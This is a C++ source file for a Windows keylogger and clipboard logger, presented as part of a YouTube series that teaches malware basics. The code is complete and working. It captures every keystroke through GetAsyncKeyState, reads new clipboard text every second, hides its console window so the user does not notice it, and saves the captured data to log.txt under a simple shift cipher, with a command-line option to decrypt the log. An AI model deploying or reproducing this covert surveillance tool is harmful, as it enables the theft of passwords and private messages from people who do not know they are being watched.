```c++
/**
 * @file keylogger.cpp
 * @brief A simple keylogger and clipboard logger program for Windows.
 *
 * ! IMPORTANT !
 * This program is part of a series of videos on my youtube channel focused on explaining the basics of each malware at an engineering level and not just superficially.
 * This series is under the name "ILEARNYOU" and there are different iterations of each program depending on the difficulty.
 * I recommend you to watch the video to understand my reasoning and explanations and not just be a script kiddie.
 * https://www.youtube.com/@impulsado
 * 
 * 
 * This program is designed to monitor and log keyboard inputs and clipboard content on a Windows machine.
 * It features a basic encryption mechanism to store the logged data securely in a file. The program
 * operates using two main threads: one for logging clipboard changes and another for capturing keystrokes.
 *
 * The clipboard logger periodically checks for changes in the system clipboard and logs any new text
 * content it detects. The keylogger captures key presses by checking the state of each key in a loop.
 * Both types of logged data are encrypted using a simple character shift cipher before being saved.
 *
 * The encryption is performed by shifting the ASCII value of each character based on a user-defined key.
 * This key is also used during decryption to restore the original data. The encrypted data is stored in
 * a log file, and a separate file is used to save the decrypted output.
 *
 * The main components of the program include:
 * - Clipboard monitoring: Retrieves and logs text content from the clipboard.
 * - Keylogging: Captures and logs user keystrokes.
 * - Encryption: Secures the logged data using a shift cipher.
 * - Decryption: Allows the encrypted data to be decrypted and read.
 *
 * @section usage Usage
 * The program can be compiled and run on Windows. It provides the following command line options:
 * - No arguments: Starts the logging of clipboard content and keystrokes.
 * - Two arguments: `-d <key>` decrypts the log file using the provided key.
 *
 * @section dependencies Dependencies
 * This program requires Windows API headers for accessing system clipboard and key states.
 *
 * @section author Author
 * @impulsado [wannaNotes](https://github.com/impulsado/wannaNotes)
 *
 * @date August 2024
 */

#include <iostream>
#include <windows.h>
#include <fstream>
#include <string>
#include <thread>

using namespace std;

// Function prototypes
bool isCapsLock();
bool isShift();
void save(const string& input, int key);
bool specialKey(char key, int passwd);
void encrypt(const string& filename, int key);
void decrypt(const string& filename, int key);
string getClipboardText();
void clipboardLogger(int key);
void keyLogger(int key);

/**
 * @brief Checks if the Caps Lock key is pressed.
 * 
 * The function checks the state of the Caps Lock key by calling the GetKeyState function with the VK_CAPITAL parameter.
 * It masks the return value with 1 to check if the least significant bit is set, which indicates the toggle state.
 * 
 * @pre The function is called.
 * @post The Caps Lock key state is checked.
 * 
 * @return True if the Caps Lock key is pressed, false otherwise.
 */
bool isCapsLock() {
    return (GetKeyState(VK_CAPITAL) & 1) != 0;
}

/**
 * @brief Checks if the Shift key is pressed.
 * 
 * The function checks the state of the Shift key by calling the GetKeyState function with the VK_SHIFT parameter.
 * It masks the return value with 0x8000 to check if the most significant bit is set, which indicates that physical press of the key.
 * 
 * @pre The function is called.
 * @post The Shift key state is checked.
 * 
 * @return True if the Shift key is pressed, false otherwise.
 */
bool isShift() {
    return (GetKeyState(VK_SHIFT) & 0x8000) != 0;
}

/**
 * @brief Saves the input string to a log file, encrypting it with a random shift.
 * 
 * The function opens the log file in append mode and writes the encrypted version of each character in the input string to the file.
 * The encryption is done by adding a mod10 shift to the ASCII value of each character.
 * 
 * @param input The string to be saved to the log file.
 * @param key The key used to generate the random shift for encryption.
 */
void save(const string& input, int key) {
    // Open a file named "log.txt" in append and binary mode
    ofstream outFile("log.txt", ios::app | ios::binary);
    // Check if the file was opened successfully
    if (!outFile.is_open()) {
        // If the file couldn't be opened, output an error message and exit the function
        cout << "Error opening log file for writing." << endl;
        return;
    }

    // Loop through each character in the input string
    for (char c : input) {
        // Calculate a shift value between 0 and 9 based on the provided key
        int shift = 1 + key % 10;
        // Encrypt the character by adding the shift value to its ASCII code and write it to the file
        outFile.put(c + shift);
    }

    // Close the file to ensure the data is written and resources are freed
    outFile.close();
}

/**
 * @brief Checks if the key is a special key and saves its name to the log file.
 * 
 * The function checks if the key is a special key (e.g., space, enter, shift, backspace, etc.) and saves its name to the log file.
 * 
 * @param key The special key to be checked.
 * @param passwd The key used to encrypt the log file.
 * 
 * @return True if the key is a special key, false otherwise.
 */
bool specialKey(char key, int passwd) {
    switch (key) {
        case VK_SPACE:
            save(" ", passwd);
            return true;
        case VK_RETURN:
            save("\n", passwd);
            return true;
        case VK_SHIFT:
            save("[SHIFT]", passwd);
            return true;
        case VK_BACK:
            save("[BACKSPACE]", passwd);
            return true;
        case VK_RBUTTON:
            save("[R_CLICK]", passwd);
            return true;
        case VK_LBUTTON:
            save("[L_CLICK]", passwd);
            return true;
        case VK_CAPITAL:
            save("[CAPS_LOCK]", passwd);
            return true;
        case VK_TAB:
            save("[TAB]", passwd);
            return true;
        case VK_UP:
            save("[UP_ARROW_KEY]", passwd);
            return true;
        case VK_DOWN:
            save("[DOWN_ARROW_KEY]", passwd);
            return true;
        case VK_LEFT:
            save("[LEFT_ARROW_KEY]", passwd);
            return true;
        case VK_RIGHT:
            save("[RIGHT_ARROW_KEY]", passwd);
            return true;
        case VK_CONTROL:
            save("[CONTROL]", passwd);
            return true;
        case VK_MENU:
            save("[ALT]", passwd);
            return true;
        default:
            return false;
    }
}

/**
 * @brief Decrypts a file using a specified key.
 * 
 * This function takes a filename and a key as input and decrypts the contents of the file using the key.
 * The decrypted content is then written to a new file named "decrypted.txt".
 * 
 * @param filename The name of the file to be decrypted.
 * @param key The key used for decryption.
 */
void decrypt(const string& filename, int key) {
    // Open the file for reading in binary mode and create a new file for writing the decrypted content
    ifstream file(filename, ios::binary);  // ifstream for reading the file
    ofstream decrypted("decrypted.txt");  // ofstream for writing the decrypted content

    // Check if the files were opened successfully
    if (!file.is_open()) {
        cout << "Error opening file." << endl;
        return;
    }

    if (!decrypted.is_open()) {
        cout << "Error creating file." << endl;
        return;
    }

    // Read each character from the file and decrypt it using the provided key
    char c;
    while (file.get(c)) {
        int shift = 1 + key % 10;  // Calculate the shift
        decrypted.put(c - shift);  // Decrypt and write to the new file
    }

    // Output a success message once the decryption is complete
    cout << "File decrypted successfully." << endl;

    // Close the files to ensure the data is written and resources are freed
    file.close();
    decrypted.close();
}

/**
 * @brief Retrieves the text currently stored in the clipboard.
 * 
 * This function opens the clipboard and retrieves the text data stored in it.
 * It returns an empty string if the clipboard cannot be opened or if there is no text data available.
 * 
 * @return The text currently stored in the clipboard.
 */
string getClipboardText() {
    // Initialize an empty string to store the clipboard text
    string text = "";

    // Attempt to open the clipboard for the current process
    // nullptr indicates that the clipboard is associated with the current task
    if (!OpenClipboard(nullptr)) return text;  // If opening fails, return an empty string

    // Retrieve a handle to the clipboard data in Unicode text format
    HANDLE hData = GetClipboardData(CF_UNICODETEXT);
    // If no data is available, or the data isn't in the expected format, return an empty string
    if (hData == nullptr) return text;

    // Lock the global memory block to get a pointer to the clipboard data
    // GlobalLock converts the handle to a pointer to access the data safely
    wchar_t* pwszText = static_cast<wchar_t*>(GlobalLock(hData));  // Locking the global memory
    if (pwszText != nullptr) {  // Check if the lock was successful
        // Convert the wide-character string (wstring) to a standard string
        wstring ws(pwszText);
        // Create a string from the wide-character string, converting it to a narrow character string
        text = string(ws.begin(), ws.end());
        // Unlock the global memory block when done to allow other applications to use it
        GlobalUnlock(hData);  // Unlocking it
    }
    
    // Close the clipboard to allow other applications to access it
    CloseClipboard();

    // Return the clipboard text retrieved, or an empty string if none was available
    return text;
}

/**
 * @brief Logs the content of the clipboard.
 * 
 * This function continuously monitors the clipboard for changes and logs the content
 * whenever a new item is added. The logged content is saved along with the provided key.
 * 
 * @param key The key used to encrypt the log file.
 */
void clipboardLogger(int key) {
    string previousClipboardContent;

    while (true) {
        Sleep(1000);

        string currentClipboardContent = getClipboardText();

        if (!currentClipboardContent.empty() && currentClipboardContent != previousClipboardContent) {
            save("\n[+]Clipboard: " + currentClipboardContent + "\n", key);
            previousClipboardContent = currentClipboardContent;
        }
    }
}

/**
 * @brief Logs the keys pressed by the user.
 * 
 * This function continuously monitors the keys pressed by the user and logs them to a file.
 * The logged keys are encrypted using the provided key.
 * 
 * @param passwd The key used to encrypt the log file.
 */
void keyLogger(int passwd) {
    ShowWindow(GetConsoleWindow(), SW_HIDE);

    while (true) {
        Sleep(50);

        for (char key = 8; key <= 173; key++) {
            if (GetAsyncKeyState(key) == 0xFFFF8001) {  // Check if a key has been pressed
                if (!specialKey(key, passwd)) {
                    string str(1, key);

                    if (!(isCapsLock() || isShift())) str[0] = tolower(str[0]);
                    else if (isCapsLock() && isShift()) str[0] = tolower(str[0]);

                    save(str, passwd);
                }
            }
        }
    }
}

int main(int argc, char** argv) {
    // Hide console window
    ShowWindow(GetConsoleWindow(), SW_HIDE);

    int key = 88;  // Define your key here (same as the example code)

    // Check for command line arguments
    if (argc == 2) {
        cout << "You need 2 arguments to decrypt the log file." << endl;
        return 1;
    } else if (argc == 3) {
        if (string(argv[1]) == "-d") {
            decrypt("log.txt", stoi(argv[2]));
            return 0;
        } else {
            cout << "Invalid argument." << endl;
            return 1;
        }
    } else if (argc > 3) {
        cout << "Too many arguments." << endl;
        return 1;
    }

    // Launch clipboard and key logger threads
    thread clipboardThread(clipboardLogger, key);
    thread keyLoggerThread(keyLogger, key);

    clipboardThread.join();
    keyLoggerThread.join();

    return 0;
}
```